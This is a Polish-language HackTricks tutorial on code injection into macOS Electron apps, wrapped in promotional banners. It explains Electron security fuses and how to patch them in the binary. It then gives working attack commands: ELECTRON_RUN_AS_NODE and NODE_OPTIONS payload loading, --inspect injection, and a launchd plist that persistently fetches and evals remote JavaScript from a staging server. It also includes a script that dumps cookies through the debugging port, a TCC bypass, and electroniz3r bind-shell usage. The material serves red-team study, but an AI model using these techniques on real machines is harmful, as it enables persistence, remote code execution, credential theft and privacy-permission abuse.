# Wstrzykiwanie aplikacji Electron w macOS

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Podstawowe informacje

Jeśli nie wiesz, czym jest Electron, możesz znaleźć [**wiele informacji tutaj**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Ale na razie wystarczy wiedzieć, że Electron uruchamia **node**.\
A node ma pewne **parametry** i **zmienne środowiskowe**, które można wykorzystać do **wykonania innego kodu** niż wskazany plik.

### Bezpieczniki Electron

Poniższe techniki zostaną omówione później, ale w ostatnim czasie Electron dodał kilka **flag bezpieczeństwa, aby im zapobiec**. Są to [**Bezpieczniki Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses), a te są używane do **zapobiegania** aplikacjom Electron w macOS przed **ładowaniem dowolnego kodu**:

* **`RunAsNode`**: Jeśli jest wyłączony, zapobiega użyciu zmiennej środowiskowej **`ELECTRON_RUN_AS_NODE`** do wstrzykiwania kodu.
* **`EnableNodeCliInspectArguments`**: Jeśli jest wyłączony, parametry takie jak `--inspect`, `--inspect-brk` nie będą respektowane. Unikając w ten sposób wstrzykiwania kodu.
* **`EnableEmbeddedAsarIntegrityValidation`**: Jeśli jest włączony, załadowany plik **`asar`** będzie **sprawdzany** przez macOS. **Zapobiegając** w ten sposób **wstrzykiwaniu kodu** poprzez modyfikację zawartości tego pliku.
* **`OnlyLoadAppFromAsar`**: Jeśli jest to włączone, zamiast szukać do załadowania w następującej kolejności: **`app.asar`**, **`app`** i w końcu **`default_app.asar`**. Będzie sprawdzał i używał tylko app.asar, co zapewnia, że gdy jest **połączony** z bezpiecznikiem **`embeddedAsarIntegrityValidation`**, jest **niemożliwe** do **załadowania niezweryfikowanego kodu**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Jeśli jest włączony, proces przeglądarki używa pliku o nazwie `browser_v8_context_snapshot.bin` dla swojego migawkowego V8.

Innym interesującym bezpiecznikiem, który nie zapobiega wstrzykiwaniu kodu, jest:

* **EnableCookieEncryption**: Jeśli jest włączony, przechowywane na dysku dane cookie są szyfrowane za pomocą kluczy kryptograficznych na poziomie systemu operacyjnego.

### Sprawdzanie bezpieczników Electron

Możesz **sprawdzić te flagi** z aplikacji za pomocą:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modyfikowanie bezpieczników Electron

Jak [**wspominają dokumenty**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracja **bezpieczników Electron** jest skonfigurowana wewnątrz **binariów Electron**, które zawierają gdzieś ciąg znaków **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

W aplikacjach macOS znajduje się to zazwyczaj w `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Możesz załadować ten plik w [https://hexed.it/](https://hexed.it/) i wyszukać poprzedni ciąg znaków. Po tym ciągu znaków w kodzie ASCII zobaczysz liczbę "0" lub "1", wskazującą, czy każdy bezpiecznik jest wyłączony lub włączony. Po prostu zmodyfikuj kod szesnastkowy (`0x30` to `0`, a `0x31` to `1`) aby **zmienić wartości bezpieczników**.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Zauważ, że jeśli spróbujesz **nadpisać** binarny plik **`Electron Framework`** wewnątrz aplikacji z tymi zmienionymi bajtami, aplikacja nie będzie działać.

## RCE dodawanie kodu do Aplikacji Electron

Może istnieć **zewnętrzne pliki JS/HTML**, które wykorzystuje Aplikacja Electron, więc atakujący może wstrzyknąć kod w te pliki, których sygnatura nie będzie sprawdzana i wykonać dowolny kod w kontekście aplikacji.

{% hint style="danger" %}
Jednakże, w chwili obecnej istnieją 2 ograniczenia:

* Wymagane jest uprawnienie **`kTCCServiceSystemPolicyAppBundles`** do modyfikacji Aplikacji, więc domyślnie to nie jest już możliwe.
* Skompilowany plik **`asap`** zazwyczaj ma bezpieczniki **`embeddedAsarIntegrityValidation`** `i` **`onlyLoadAppFromAsar`** `włączone`

Co sprawia, że ten ścieżka ataku staje się bardziej skomplikowana (lub niemożliwa).
{% endhint %}

Zauważ, że możliwe jest obejście wymagania **`kTCCServiceSystemPolicyAppBundles`** poprzez skopiowanie aplikacji do innego katalogu (np. **`/tmp`**), zmianę nazwy folderu **`app.app/Contents`** na **`app.app/NotCon`**, **modyfikację** pliku **asar** swoim **złośliwym** kodem, zmianę nazwy z powrotem na **`app.app/Contents`** i uruchomienie go.

Możesz rozpakować kod z pliku asar za pomocą:
```bash
npx asar extract app.asar app-decomp
```
I spakuj to z powrotem po dokonaniu modyfikacji za pomocą:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE z `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Zgodnie z [**dokumentacją**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), jeśli ta zmienna środowiskowa jest ustawiona, proces zostanie uruchomiony jako zwykły proces Node.js.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Jeśli flaga **`RunAsNode`** jest wyłączona, zmienna środowiskowa **`ELECTRON_RUN_AS_NODE`** zostanie zignorowana, i to nie zadziała.
{% endhint %}

### Wstrzykiwanie z pliku App Plist

Jak [**zaproponowano tutaj**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), można nadużyć tej zmiennej środowiskowej w pliku plist, aby utrzymać trwałość:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE z `NODE_OPTIONS`

Możesz przechowywać ładunek w innym pliku i go wykonać:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Jeśli bezpiecznik **`EnableNodeOptionsEnvironmentVariable`** jest **wyłączony**, aplikacja **zignoruje** zmienną środowiskową **NODE\_OPTIONS** podczas uruchamiania, chyba że zmienna środowiskowa **`ELECTRON_RUN_AS_NODE`** jest ustawiona, co również będzie **ignorowane**, jeśli bezpiecznik **`RunAsNode`** jest wyłączony.

Jeśli nie ustawisz **`ELECTRON_RUN_AS_NODE`**, otrzymasz **błąd**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### Wstrzykiwanie z pliku Plist aplikacji

Możesz nadużyć tej zmiennej środowiskowej w pliku plist, aby utrzymać trwałość, dodając te klucze:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE z inspekcją

Zgodnie z [**tym**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), jeśli uruchomisz aplikację Electron z flagami takimi jak **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, **otwarty zostanie port debugowania**, dzięki czemu możesz się do niego podłączyć (na przykład z Chrome w `chrome://inspect`) i będziesz mógł **wstrzykiwać w niego kod** lub nawet uruchamiać nowe procesy.\
Na przykład:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Jeśli włączony jest bezpiecznik **`EnableNodeCliInspectArguments`**, aplikacja **zignoruje parametry node** (takie jak `--inspect`) podczas uruchamiania, chyba że zmienna środowiskowa **`ELECTRON_RUN_AS_NODE`** jest ustawiona, co również **zostanie zignorowane**, jeśli bezpiecznik **`RunAsNode`** jest wyłączony.

Jednak nadal można użyć parametru **electron `--remote-debugging-port=9229`**, ale poprzedni ładunek nie zadziała do uruchamiania innych procesów.
{% endhint %}

Używając parametru **`--remote-debugging-port=9222`** można ukraść pewne informacje z aplikacji Electron, takie jak **historia** (z poleceniami GET) lub **ciasteczka** przeglądarki (ponieważ są **odszyfrowane** wewnątrz przeglądarki i istnieje **punkt końcowy json**, który je udostępni).

Możesz dowiedzieć się jak to zrobić [**tutaj**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) i [**tutaj**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) oraz użyć automatycznego narzędzia [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) lub prostego skryptu jak:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
W [**tym wpisie na blogu**](https://hackerone.com/reports/1274695), to debugowanie jest wykorzystywane do spowodowania, że headless chrome **pobiera dowolne pliki w dowolnych lokalizacjach**.

### Wstrzykiwanie z pliku App Plist

Możesz wykorzystać tę zmienną środowiskową w pliku plist, aby zachować trwałość, dodając te klucze:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Ominięcie TCC wykorzystujące starsze wersje

{% hint style="success" %}
Demon TCC z macOS nie sprawdza wykonanej wersji aplikacji. Jeśli więc **nie możesz wstrzyknąć kodu do aplikacji Electron** żadną z poprzednich technik, możesz pobrać poprzednią wersję aplikacji i wstrzyknąć w nią kod, ponieważ nadal uzyska uprawnienia TCC (chyba że pamięć podręczna zaufania temu zapobiegnie).
{% endhint %}

## Uruchamianie kodu nie-JS

Poprzednie techniki pozwolą Ci uruchomić **kod JS w procesie aplikacji elektronowej**. Pamiętaj jednak, że **procesy potomne działają w ramach tego samego profilu piaskownicy** co aplikacja nadrzędna i **dziedziczą swoje uprawnienia TCC**.\
Dlatego jeśli chcesz nadużyć uprawnień, aby na przykład uzyskać dostęp do kamery lub mikrofonu, po prostu **uruchom inny plik binarny z procesu**.

## Automatyczne wstrzykiwanie

Narzędzie [**electroniz3r**](https://github.com/r3ggi/electroniz3r) można łatwo użyć do **znalezienia podatnych aplikacji elektronowych** zainstalowanych i wstrzyknięcia w nich kodu. To narzędzie spróbuje użyć techniki **`--inspect`**:

Musisz go skompilować samodzielnie i możesz go użyć w ten sposób:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Odnośniki

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
